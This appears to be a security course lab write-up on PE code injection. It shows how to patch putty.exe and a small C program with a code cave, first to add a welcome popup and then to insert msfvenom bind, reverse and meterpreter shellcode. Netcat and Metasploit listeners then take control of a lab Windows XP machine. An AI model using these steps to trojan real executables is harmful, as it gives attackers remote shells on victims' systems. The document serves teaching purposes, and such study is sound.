# PE Code Injection

### What is PE Code Injection?

Portable Execution Code Injection is a method of executing arbitrary code in the address space of a separate live process.

### Tools Needed

1. A Windows XP machine
2. XVI32 (Windows hex editor)
3. OllyDbg (Debugger)
4. putty.exe
5. LordPE (Tool which will be used to add code cave in our program)
6. Kali Linux

### **Implement PE Code Injection to insert the code of MessageBoxA in any existing win32 executable file with different variants. This alert box should pop up with the message “Welcome Your_name” whenever you run the executable file. Once, you exit the alert box, your executable should function normally.**

Using LordPE, add a section to the executable file, section1 here. Add a virtual and raw size of 5000 bytes.

![Screenshot 2022-01-20 at 8.57.17 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_8.57.17_AM.png)

![Screenshot 2022-01-20 at 8.58.34 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_8.58.34_AM.png)

If we try to run the `putty0`, windows denies to run the program because the size of executable and header doesn’t match now. 

![Screenshot 2022-01-20 at 9.06.17 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_9.06.17_AM.png)

Now we need to add 5000 bytes into the file using XVI32.

![Screenshot 2022-01-20 at 9.00.46 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_9.00.46_AM.png)

![Screenshot 2022-01-20 at 8.59.51 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_8.59.51_AM.png)

Now if we try to run the file there is now Win32 application error because the size is matching with the header.

Using OllyDbg, it can be see that the new section has been added.

![Screenshot 2022-01-20 at 9.01.25 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_9.01.25_AM.png)

`Code cave address: 004D2000`

Code cave is a sequence of null bytes in a process's memory, offering the capacity for the injection of custom instructions by an attacker.

```bash
Original entry points:

00475CA0 > $ E8 9A020000    CALL putty1.00475F3F
00475CA5   .^E9 84FEFFFF    JMP putty1.00475B2E
00475CAA  /$ 55             PUSH EBP
00475CAB  |. 8BEC           MOV EBP,ESP
```

Go to the first instruction, and edit it by selecting and pressing space bar.  `JMP 004D2000`

![Screenshot 2022-01-25 at 1.18.50 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_1.18.50_PM.png)

Right click → Copy to executable → Selection then Right click & save file as `putty1.1`.

![Screenshot 2022-01-25 at 1.22.12 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_1.22.12_PM.png)

Open `putty1.1` in OllyDbg and press F7. F7 is executing the same instruction one by one. Select sizeable portion of the file, Right click → Binary → Fill with NOPs and save the selection. `putty1.2`

![Screenshot 2022-01-25 at 1.29.49 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_1.29.49_PM.png)

**MessageBoxA** is a function call which has four parameters to be pushed onto the stack before we can call MessageBoxA

```c
int MessageBoxA(
  [in, optional] HWND   hWnd,
  [in, optional] LPCSTR lpText,
  [in, optional] LPCSTR lpCaption,
  [in]           UINT   uType
);
```

- HWND - A handle to the owner window of the message box to be created.
- LPCTSTR - The message which is to be displayed.
- LPCTSTR - The dialogue box title.
- UINT - Type of the dialogue box. If the parameter value is 0, the message box contains one push button: OK.

Select some space or few of these lines to create strings. Right click after selecting and select Binary → Edit. Go to ASCII tab and type “Welcome Dhairya”. Click OK. 

![Screenshot 2022-02-24 at 9.56.16 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_9.56.16_AM.png)

![Screenshot 2022-02-24 at 9.59.56 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_9.59.56_AM.png)

Now we need to add MessageBox parameters. 

```c
PUSH 0
PUSH ADDR
PUSH ADDR
PUSH 0
CALL MessageBoxA
```

![Screenshot 2022-02-24 at 10.01.07 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_10.01.07_AM.png)

Adding original entry point so that once we exit the alert box, our executable should function normally.

![Screenshot 2022-02-24 at 10.03.38 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_10.03.38_AM.png)

![Screenshot 2022-02-24 at 10.04.07 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_10.04.07_AM.png)

![Screenshot 2022-02-24 at 10.05.13 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_10.05.13_AM.png)

![Screenshot 2022-02-24 at 10.07.26 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_10.07.26_AM.png)

Select the modifications & save the file.

Now when we execute our file, alert box pops up with the message “Welcome Dhairya” and then after clicking OK, it returns the original program.

![Screenshot 2022-02-24 at 10.08.46 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_10.08.46_AM.png)

![Screenshot 2022-02-24 at 10.09.08 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_10.09.08_AM.png)

---

### **Replicate the above experiment by injecting the code of MessageBoxA in a your own coded windows C executable file, keeping all other steps same.**

C program:

```c
#include<stdio.h>
void main(){
  printf("Hello dhairya!");
}
```

![Screenshot 2022-02-24 at 1.18.04 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.18.04_PM.png)

Using gcc to compile the program.

```bash
gcc welcome.c -o welcome
```

![Screenshot 2022-02-22 at 12.31.48 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-22_at_12.31.48_PM.png)

Using iexpress application to create a self-extracting executable file (.exe).

![Screenshot 2022-02-22 at 12.28.55 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-22_at_12.28.55_PM.png)

![Screenshot 2022-02-22 at 12.32.23 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-22_at_12.32.23_PM.png)

![Screenshot 2022-02-22 at 12.34.11 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-22_at_12.34.11_PM.png)

Using LordPE, add a section to the executable file, section1 here. Add a virtual and raw size of 5000 bytes.

![Screenshot 2022-02-24 at 1.33.34 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.33.34_PM.png)

Now we need to add 5000 bytes into the file using XVI32.

![Screenshot 2022-02-24 at 1.34.34 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.34.34_PM.png)

Using OllyDbg, it can be see that the new section has been added.

![Screenshot 2022-02-24 at 1.36.08 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.36.08_PM.png)

Code cave address: `01018000`

```
Original entry points:

0100645C >|$ E8 0A000000    CALL welcome.0100646B
01006461  \.^E9 7AFFFFFF    JMP welcome.010063E0
```

Go to the first instruction, and edit it by selecting and pressing space bar

![Screenshot 2022-02-24 at 1.37.14 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.37.14_PM.png)

Open the executable in OllyDbg and press F7. Select sizeable portion of the file, Right click → Binary → Fill with NOPs and save the selection. 

![Screenshot 2022-02-24 at 1.38.49 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.38.49_PM.png)

Select some space or few of these lines to create strings. Right click after selecting and select Binary → Edit. Go to ASCII tab and type “Welcome Dhairya”. Click OK. 

![Screenshot 2022-02-24 at 1.40.08 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.40.08_PM.png)

![Screenshot 2022-02-24 at 1.40.46 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.40.46_PM.png)

Adding original entry point so that once we exit the alert box, our executable should function normally.

![Screenshot 2022-02-24 at 1.43.15 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.43.15_PM.png)

Add MessageBox parameters. Select the modifications & save the file.

![Screenshot 2022-02-24 at 1.43.59 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.43.59_PM.png)

Now when we execute our file, alert box pops up with the message “Welcome Dhairya” and then after clicking OK, it returns the original program.

![Screenshot 2022-02-24 at 1.45.04 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-02-24_at_1.45.04_PM.png)

---

### **Generate the “Bind Shell Code” and “Reverse Bind shell Code” using Metasploit and inject these respective shell codes into the executable file in order to get access to the shell of a target machine.**

### **Bonus: Use meterpreter shell code and demonstrate advance level control of victim machine.**

Windows XP IP: `172.16.244.138`

Kali Linux IP: `172.16.244.128`

Using LordPE, add a section to the executable file, section1 here. Add a virtual and raw size of 5000 bytes.

![Screenshot 2022-01-20 at 8.57.17 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_8.57.17_AM.png)

If we try to run the `putty0`, windows denies to run the program because the size of executable and header doesn’t match now. 

![Screenshot 2022-01-20 at 9.06.17 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_9.06.17_AM.png)

Now we need to add 5000 bytes into the file using XVI32.

![Screenshot 2022-01-20 at 9.00.46 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_9.00.46_AM.png)

Now if we try to run the file there is now Win32 application error because the size is matching with the header.

Using OllyDbg, it can be see that the new section has been added.

![Screenshot 2022-01-20 at 9.01.25 AM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-20_at_9.01.25_AM.png)

`Code cave address: 004D2000`

```bash
Original entry points:

00475CA0 > $ E8 9A020000    CALL putty1.00475F3F
00475CA5   .^E9 84FEFFFF    JMP putty1.00475B2E
00475CAA  /$ 55             PUSH EBP
00475CAB  |. 8BEC           MOV EBP,ESP
```

Go to the first instruction, and edit it by selecting and pressing space bar.  `JMP 004D2000`

![Screenshot 2022-01-25 at 1.18.50 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_1.18.50_PM.png)

Right click → Copy to executable → Selection then Right click & save file as `putty1.1`.

![Screenshot 2022-01-25 at 1.22.12 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_1.22.12_PM.png)

Open `putty1.1` in OllyDbg and press F7. F7 is executing the same instruction one by one. Select sizeable portion of the file, Right click → Binary → Fill with NOPs and save the selection. `putty1.2`

![Screenshot 2022-01-25 at 1.29.49 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_1.29.49_PM.png)

Generating payload using msfvenom:

```bash
# Bind Shell
msfvenom -p windows/shell_bind_tcp LPORT=5656 -f hex

# Reverse Shell
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.244.128 LPORT=1234 -f hex
```

![Screenshot 2022-01-25 at 3.45.28 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_3.45.28_PM.png)

Go back to OllyDbg, press F7, select sufficient portion & copy the payload, right click and select Binary → Binary paste. Save the selection.

Bind shell: `putty1.3`

Reverse shell: `putty1.4`

Start netcat listener on attacker machine and execute the modified putty file.

```bash
# Bind Shell
nc 172.16.244.138 5656

# Reverse Shell
nc -nlvp 1234
```

![Screenshot 2022-01-25 at 3.32.42 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_3.32.42_PM.png)

Gained root shell.

We can see that mentioned port (here 5656) is now open using `netstat -a`

![Screenshot 2022-01-25 at 3.57.35 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-01-25_at_3.57.35_PM.png)

**Bonus: Use meterpreter shell code and demonstrate advance level control of victim machine.**

Generating meterpreter shell code using msfvenom:

```bash
msfvenom -p **windows/meterpreter/reverse_tcp** LHOST=172.16.244.128 LPORT=1234 -f hex
```

![Screenshot 2022-03-01 at 8.59.00 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-03-01_at_8.59.00_PM.png)

Go to OllyDbg, open `putty1.2` file and press F7. Select sufficient portion & copy the payload, right click and select Binary → Binary paste. Save the selection. Save file as `putty1.7`

![Screenshot 2022-03-01 at 8.52.11 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-03-01_at_8.52.11_PM.png)

Using metasploit’s payload handler `exploit/multi/handler`  to gain advance level control of victim machine:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.16.244.128
set LPORT 1234
exploit
```

![Screenshot 2022-03-01 at 9.09.59 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-03-01_at_9.09.59_PM.png)

![Screenshot 2022-03-01 at 9.14.01 PM.png](PE%20Code%20Injection%208408462c76cc48f1825e72c162efb178/Screenshot_2022-03-01_at_9.14.01_PM.png)

Gained meterpreter shell.

---
